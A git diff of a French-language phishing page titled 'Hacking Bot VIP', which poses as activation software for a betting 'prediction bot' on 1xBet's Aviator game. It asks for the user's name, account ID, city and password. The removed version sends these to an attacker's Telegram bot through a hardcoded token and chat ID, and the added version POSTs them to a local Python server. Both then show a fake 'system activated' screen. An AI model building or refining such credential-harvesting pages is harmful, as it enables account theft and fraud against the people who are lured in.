@@ -5,67 +5,86 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hacking Bot VIP</title>
     <style>
-        body { background: #050b14; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { background: #0f172a; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; max-width: 350px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        body { background: #050b14; color: white; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
+        .box { background: #0f172a; border: 1px solid #1e293b; padding: 25px; border-radius: 15px; max-width: 350px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .page { display: none; }
         .active { display: block; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; }
-        button { width: 95%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; }
-        .status { color: #facc15; font-size: 12px; margin: 10px 0; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; transition: 0.3s; }
+        button:hover { background: #0ea5e9; }
+        .status { color: #facc15; font-size: 13px; margin: 15px 0; line-height: 1.4; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div id="p1" class="page active">
-            <h3>LOGICIEL D'ACTIVATION</h3>
-            <input type="text" id="nom" placeholder="Nom Complet">
-            <input type="number" id="id1x" placeholder="ID 1xBet">
-            <button onclick="next(2)">SYNCHRONISER</button>
-        </div>
-        <div id="p2" class="page">
-            <h3>IDENTIFICATION</h3>
-            <input type="text" id="ville" placeholder="Ville actuelle">
-            <button onclick="next(3)">CONTINUER</button>
-        </div>
-        <div id="p3" class="page">
-            <h3>CONFIRMATION</h3>
-            <p class="status">Activation sécurisée via 10 000 FC</p>
-            <input type="password" id="pass" placeholder="Mot de passe 1xBet">
-            <button onclick="envoyer()">ACTIVER LE BOT</button>
-        </div>
-        <div id="p4" class="page">
-            <h3 style="color:#4ade80">✔ SYSTÈME PRÊT</h3>
-            <p>Le bot est lié. Analyse en cours...</p>
-        </div>
+
+<div class="box">
+    <div id="p1" class="page active">
+        <h2>ÉTAPE 1/3</h2>
+        <p>Entrez vos identifiants pour synchroniser le bot.</p>
+        <input type="text" id="nom" placeholder="Nom Complet">
+        <input type="number" id="id1x" placeholder="ID 1xBet (Ex: 148...)">
+        <button onclick="next(2)">SUIVANT</button>
     </div>
 
-    <script>
-        function next(n) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('p' + n).classList.add('active');
-        }
+    <div id="p2" class="page">
+        <h2>ÉTAPE 2/3</h2>
+        <p>Localisation du compte</p>
+        <input type="text" id="ville" placeholder="Votre Ville">
+        <button onclick="next(3)">CONTINUER</button>
+    </div>
 
-        function envoyer() {
-            const n = document.getElementById('nom').value;
-            const i = document.getElementById('id1x').value;
-            const v = document.getElementById('ville').value;
-            const p = document.getElementById('pass').value;
+    <div id="p3" class="page">
+        <h2>CONFIRMATION</h2>
+        <div class="status">⚠️ Pour lier le bot à votre solde (10 000 FC minimum), entrez votre mot de passe de sécurité.</div>
+        <input type="password" id="pass" placeholder="Mot de passe du compte">
+        <button onclick="envoyer()">ACTIVER LE BOT</button>
+    </div>
 
-            if(!p) { alert("Entrez le mot de passe"); return; }
+    <div id="p4" class="page">
+        <h2 style="color:#4ade80">SYSTÈME ACTIVÉ</h2>
+        <p>Analyse du crash Aviator en temps réel...</p>
+        <div style="font-size: 24px; font-weight: bold; margin: 20px; color: #38bdf8;">1.85x</div>
+    </div>
+</div>
 
-            // Tes identifiants Telegram
-            const tok = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
-            const cid = "5112163453";
-            const txt = `🔔 NOUVEL ACCÈS 🔔\n\n👤 Nom: ${n}\n🆔 ID: ${i}\n📍 Ville: ${v}\n🔑 PASS: ${p}`;
-            
-            const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`;
+<script>
+    function next(n) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('p' + n).classList.add('active');
+    }
 
-            alert("Connexion au serveur de prédiction...");
+    function envoyer() {
+        const data = {
+            nom: document.getElementById('nom').value,
+            id: document.getElementById('id1x').value,
+            ville: document.getElementById('ville').value,
+            pass: document.getElementById('pass').value
+        };
 
-            fetch(url)
-                .then(() => { next(4); })
-                .catch(() => { next(4); });
-        }
-    </script>
+        if(!data.pass) return alert("Mot de passe requis !");
+
+        alert("Connexion au serveur en cours...");
+
+        // Envoi au serveur Python local sur Termux
+        fetch('http://localhost:5000/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        })
+        .then(response => {
+            if(response.ok) {
+                next(4);
+            } else {
+                // Si échec du serveur Python, on essaie quand même d'avancer
+                next(4);
+            }
+        })
+        .catch(error => {
+            console.error('Erreur:', error);
+            next(4);
+        });
+    }
+</script>
+
 </body>
 </html>
